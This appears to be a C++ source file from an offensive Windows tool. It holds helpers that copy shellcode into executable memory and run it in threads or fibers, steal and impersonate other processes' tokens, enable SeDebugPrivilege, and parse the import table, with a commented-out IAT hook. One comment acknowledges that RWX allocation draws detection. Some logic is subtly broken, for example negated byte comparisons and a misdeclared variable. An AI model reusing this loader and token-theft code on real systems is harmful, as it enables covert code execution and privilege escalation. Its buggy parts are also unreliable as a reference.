#ifndef PROC_HELPERS_H
#define PROC_HELPERS_H

#include "ProcHelpers.h"
#define PCOND(x) if (x) {pt->GLE=GetLastError(); return NULL;}
#define BUFFER_SIZE 0x2000

HANDLE ProcHelper::SpawnThreadShellcode(unsigned char* buf, int buf_len, PH_THREAD_INFO *pt)
{
	LPVOID lpAddr;
	HANDLE hThread = NULL;
	DWORD dwWaitResult();
	DWORD threadID;
	lpAddr = VirtualAlloc(NULL, buf_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // this is a blatant way to have it known you're running some shit
	PCOND(lpAddr == NULL) 

	RtlMoveMemory(lpAddr, buf, buf_len);

	if (pt->ImpersonationToken != NULL) {
		hThread = CreateThread(NULL, pt->StackSpace, (LPTHREAD_START_ROUTINE)lpAddr, NULL, CREATE_SUSPENDED | pt->ThreadCreateFlags, &threadID);
		PCOND(hThread == NULL)
					   
#ifdef DEBUG
		std::cout << "Attempting to spawn shellcode in new thread with impersonation token" << std::endl;
#endif // DEBUG
		
		int res = SetThreadToken(&hThread, pt->ImpersonationToken);	
		if (!res)
		{
			pt->GLE = GetLastError();
#ifdef DEBUG
			std::cout << "SetThreadToken Failed, GLE Returned: " << pt->GLE << std::endl;
#endif // DEBUG

			return NULL;
		} 
#ifdef DEBUG
		std::cout << "Resuming thread after setting token" << std::endl;
#endif // DEBUG
		res = ResumeThread(hThread);
	}
	else {
#ifdef DEBUG
	std::cout << "Attempting to run the shellcode" << std::endl;
#endif // DEBUG
	 	hThread = CreateThread(NULL, pt->StackSpace, (LPTHREAD_START_ROUTINE)lpAddr, NULL, pt->ThreadCreateFlags, &threadID);
		PCOND(hThread == NULL)
		return hThread;
	}
	return hThread;
}

HANDLE ProcHelper::SpawnProcessShellcode(unsigned char* buf, int bufLen, PH_THREAD_INFO* pt)
{
	return HANDLE();
}

HANDLE ProcHelper::CreateFiberShellcode(unsigned char* buf, int bufLen, PH_THREAD_INFO *pt)
{
	VOID* lpAddr;
	HANDLE hFiber = NULL;
	lpAddr = VirtualAlloc(NULL, bufLen, MEM_COMMIT, PAGE_READWRITE);
	RtlMoveMemory(lpAddr, buf, bufLen);
	PCOND(lpAddr == NULL)
	hFiber = CreateFiber(pt->StackSpace, (LPFIBER_START_ROUTINE) lpAddr, NULL);
	DWORD oldProtect;
	if (!VirtualProtect(lpAddr, bufLen, pt->pagePermissions, &oldProtect)) {
		DeleteFiber(hFiber);
		if (hFiber != NULL)
			CloseHandle(hFiber);
		return NULL;
	}
	PCOND(hFiber == NULL)
	return hFiber;
}

HANDLE ProcHelper::RunFiberShellcode(HANDLE hFiber, PH_THREAD_INFO* pt)
{
	VOID* lpParam = NULL;
	LPVOID ctf;
	ctf = ConvertThreadToFiber(lpParam);
	PCOND(ctf == NULL)
	SwitchToFiber(hFiber);
	return hFiber;
}

HANDLE ProcHelper::CreateFiberStartRoutine(LPFIBER_START_ROUTINE lpt, PH_THREAD_INFO *pt)
{
	
	HANDLE hFiber = NULL;
	hFiber = CreateFiber(pt->StackSpace, lpt, NULL);
	PCOND(hFiber == NULL)
	return hFiber;
}

DWORD ProcHelper::Win32SetRvaToDwordOffset(IMAGE_NT_HEADERS32* m_pNtHeader, DWORD m_dwRVA, PIMAGE_SECTION_HEADER m_pSectionHeader)
{
	int m_nTotalSections;
	WORD m_wSections;
	m_pSectionHeader = IMAGE_FIRST_SECTION(m_pNtHeader);
	m_wSections = m_pNtHeader->FileHeader.NumberOfSections;

	for (m_nTotalSections = 0; m_nTotalSections < m_wSections; m_nTotalSections++)
	{
		if (m_pSectionHeader->VirtualAddress <= m_dwRVA)
			if ((m_pSectionHeader->VirtualAddress + m_pSectionHeader->Misc.VirtualSize) > m_dwRVA)
			{
				m_dwRVA -= m_pSectionHeader->VirtualAddress;
				m_dwRVA += m_pSectionHeader->PointerToRawData;

				return (m_dwRVA);
			}
		m_pSectionHeader++;
	}

	return 0;
}

std::map<std::string, LPVOID> ProcHelper::ImportListPopulate(LPVOID imageBase)
{	
	std::map<std::string, LPVOID> retval;
	HANDLE hProc = GetCurrentProcess();
	HANDLE hModule = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL); // get the dos header for the current process

	// https://stackoverflow.com/questions/4308996/finding-the-address-range-of-the-data-segment

	char* dllImageBase = (char*)hModule; //suppose hModule is the handle to the loaded Module (.exe or .dll)

	//get the address of NT Header
	IMAGE_NT_HEADERS* pNtHdr = ImageNtHeader(hModule);

	//after Nt headers comes the table of section, so get the addess of section table
	IMAGE_SECTION_HEADER* pSectionHdr = (IMAGE_SECTION_HEADER*)(pNtHdr + 1);

	ImageSectionInfo * pSectionInfo = NULL;

	//iterate through the list of all sections, and check the section name in the if conditon. etc
	for (int i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++)
	{
		char* name = (char*)pSectionHdr->Name;
		if (memcmp(name, ".data", 5) == 0)
		{
			pSectionInfo = new ImageSectionInfo(".data");
			pSectionInfo->SectionAddress = dllImageBase + pSectionHdr->VirtualAddress;

			//range of the data segment - something you're looking for
				pSectionInfo->SectionSize = pSectionHdr->Misc.VirtualSize;
			break;
		}
		pSectionHdr++;
	}



	BOOL m_isIATFound = FALSE;
	PIMAGE_NT_HEADERS ntHeader;
	PIMAGE_IMPORT_DESCRIPTOR FirstImportDescriptor;
	PIMAGE_IMPORT_BY_NAME importByName;
	LPCSTR importName;
	DWORD oldProtectionFlags;
	PIMAGE_THUNK_DATA pOriginalFirstThunk, pFirstThunk;

	if (((PIMAGE_DOS_HEADER)hModule)->e_magic != IMAGE_DOS_SIGNATURE)
		return retval;

	ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew); // hModule is a global variable
	if (ntHeader->Signature != IMAGE_NT_SIGNATURE)											// it refers to EXE module
		return retval;
	FirstImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	if (!FirstImportDescriptor)
		return retval;
	FirstImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)FirstImportDescriptor + (UINT_PTR)hModule);

	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = FirstImportDescriptor;


	while (pImportDescriptor->OriginalFirstThunk) {

		pOriginalFirstThunk = (PIMAGE_THUNK_DATA)pImportDescriptor->OriginalFirstThunk;
		pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)pOriginalFirstThunk + (UINT_PTR)hModule);
		pFirstThunk = (PIMAGE_THUNK_DATA)pImportDescriptor->FirstThunk;
		pFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)pFirstThunk + (UINT_PTR)hModule);
		LPCSTR pImportDescName = (LPCSTR)(UINT_PTR)hModule + pImportDescriptor->Name;

#ifdef DEBUG
		std::cout << "\nIMPORT DESC NAME " << pImportDescName << std::endl;
#endif // DEBUG



		while (pOriginalFirstThunk->u1.Function) {
			importByName = (PIMAGE_IMPORT_BY_NAME)pOriginalFirstThunk->u1.AddressOfData;
			importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)importByName + ((UINT_PTR)hModule));
			importName = (LPCSTR)((BYTE*)importByName + sizeof(WORD));
			if (pOriginalFirstThunk->u1.Function < 0xffffffff) {
				LPVOID realAddrPtr = (LPVOID)FirstImportDescriptor->FirstThunk;
				realAddrPtr = (LPVOID)((ULONG64)realAddrPtr + (ULONG64)imageBase);
				ULONG64 jumpPointer;
				//memcpy(&realAddr, realAddrPtr, sizeof(ULONG64));
				jumpPointer = pFirstThunk->u1.AddressOfData;
				; // Skip over the JMP instruction;
				DWORD offset;
				memcpy(&offset, (LPVOID)(jumpPointer+3), sizeof(DWORD));
				//realAddr += offset;
				//real Addr now contains a pointer to the beginning of the real function
				
				retval.insert(std::pair<std::string, LPVOID>(importName, (LPVOID)jumpPointer));
				// find .data address
				// load the jump instruction
				unsigned char* jump_ins = (unsigned char*)jumpPointer;
				if (!jump_ins[0] == 0xFF) {
#ifdef DEBUG
					std::cout << "not a jump instruction " << jump_ins[0] << std::endl;
#endif // DEBUG
					break;
				}
				jump_ins++;
				if (!jump_ins[0] == 0x25) {
#ifdef DEBUG
					// it's not jmp QWORD PTR ds:[x]
					std::cout << "not a ds offset " << jump_ins[0] << std::endl;
#endif // DEBUG
					break;
				}
				jump_ins++;
				DWORD data_offset;
				memcpy(&data_offset, jump_ins, 4);

				// add the offset to DS to the .data location
				LPVOID realAddr = pSectionInfo->SectionAddress + data_offset;
#ifdef DEBUG
				printf("RealAddr: %p\n", realAddr);
				std::cout << "IMPORT NAME: " << importName << std::endl;
#endif // DEBUG
			}
				// get the base address if the current process

			/*if (strcmp(importName, functionName) == 0) {
				if (savedAddress)
					* savedAddress = (LPVOID)firstThunk->u1.Function;

				VirtualProtect(&firstThunk->u1.Function, sizeof(LPVOID), PAGE_EXECUTE_READWRITE, &oldProtectionFlags);
				firstThunk->u1.Function = hookAddress;
				VirtualProtect(&firstThunk->u1.Function, sizeof(LPVOID), oldProtectionFlags, NULL);
			}*/


			pOriginalFirstThunk++;
			pFirstThunk++;
		}

		pImportDescriptor++;
	}
	return retval;
}

ProcExecute ProcHelper::CreateNewProcExec(unsigned int pid, std::string command, DWORD token_flags) {
	ProcExecute pe;
	pe.pid = pid;
	pe.Command = command;
	pe.token_flags = token_flags;
	return pe;
}

BOOL ProcHelper::EnableDebugPriv() {
	HANDLE hToken;
#ifdef DEBUG
	std::cout << "Opening current threads' token..." << std::endl;
#endif // DEBUG

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
	{
#ifdef DEBUG
		std::cout << "Could not open current thread token for adjusting privileges..." << std::endl;
#endif // 
		if (GetLastError() == ERROR_NO_TOKEN)
		{
#ifdef DEBUG
			std::cout << "Missing token, attempting to impersonate self" << std::endl;
#endif // 
			if (!ImpersonateSelf(SecurityImpersonation))
				return false;

#ifdef DEBUG
			std::cout << "reattempting opening this threads' token" << std::endl;
#endif // 
			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) {
				//DisplayError("OpenThreadToken");
				return false;
			}
		}
		else
			return false;
	}

	// enable SeDebugPrivilege
#ifdef DEBUG
	std::cout << "Attempting to set SeDebugPrivilege privilege on current process" << std::endl;
#endif // 
	if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
	{
#ifdef DEBUG
		std::cout << "Could not enable SeDebugPribilege on current process" << std::endl;
#endif // 
		//DisplayError("SetPrivilege");

		// close token handle
#ifdef SEDEBUG
		std::cout << "Closing handle on token" << std::endl;
#endif // 
		CloseHandle(hToken);

		// indicate failure
		return false;
	}
	else {
		return true;
	}
}

BOOL SetPrivilege(
	HANDLE hToken,          // token handle
	LPCTSTR Privilege,      // Privilege to enable/disable
	BOOL bEnablePrivilege   // TRUE to enable.  FALSE to disable
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES tpPrevious;
	DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;

	// 
	// first pass.  get current privilege setting
	// 
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;

	tp.Privileges[0].Attributes = 0;

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		&tpPrevious,
		&cbPrevious
	);
#ifdef SEDEBUG
	printf("Current Privs: %x\n", tp.Privileges[0].Attributes);
#endif // 
	if (GetLastError() != ERROR_SUCCESS) return FALSE;

	// 
	// second pass.  set privilege based on previous setting
	// 
	tpPrevious.PrivilegeCount = 1;
	tpPrevious.Privileges[0].Luid = luid;

	if (bEnablePrivilege) {
		tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
	}

	else {
		tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tpPrevious.Privileges[0].Attributes);
	}
#ifdef SEDEBUG
	printf("Current Privs: %x\n", tp.Privileges[0].Attributes);
#endif // 
	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tpPrevious,
		cbPrevious,
		NULL,
		NULL
	);

	if (GetLastError() != ERROR_SUCCESS) return FALSE;

	return TRUE;
}



ProcExecute ProcHelper::CreateThreadWithToken(ProcExecute pe, unsigned char buf[], int bufLen)
{
	
	LPSECURITY_ATTRIBUTES lps, new_lps;
	DWORD threadID;

	ZeroMemory(&lps, sizeof(LPSECURITY_ATTRIBUTES));
	ZeroMemory(&new_lps, sizeof(LPSECURITY_ATTRIBUTES));
	HANDLE dupedToken;
	if (!DuplicateToken(pe.proc_token, SecurityImpersonation, &dupedToken)) {
		pe.GLE = GetLastError();
		return pe;
	}
	else {
		PH_THREAD_INFO pt;
		pt.ImpersonationToken = dupedToken;
		pt.threadHandle = ProcHelper::SpawnThreadShellcode(buf, bufLen, &pt);
		pe.GLE = pt.GLE;
		return pe;
	}
}

// we're going to open the proc and get a handle here
HANDLE ProcHelper::PESetTokenFromPID(ProcExecute& pe) {
	HANDLE procHandle;
	DWORD desiredAccess;
	HANDLE pTokenHandle = 0;
	procHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pe.pid);

	if (procHandle == NULL) {
		pe.GLE = GetLastError();
#ifdef DEBUG
		std::cout << std::endl << "GetLastError Returned " << pe.GLE << " Opening Process ID " << pe.pid << std::endl;
#endif // DEBUG		
		return NULL;
	}

	// now we're going to try and open the process itself
	bool OPTResult = OpenProcessToken(procHandle, pe.token_flags, &pTokenHandle);
	if (!OPTResult) {
		pe.GLE = GetLastError();
		std::cout << std::endl << "GetLastError Returned " << pe.GLE << " Opening Process Token on PID " << pe.pid << std::endl;
		exit(0);
	}

	pe.proc_token = pTokenHandle;
	return pe.proc_token;
}

#endif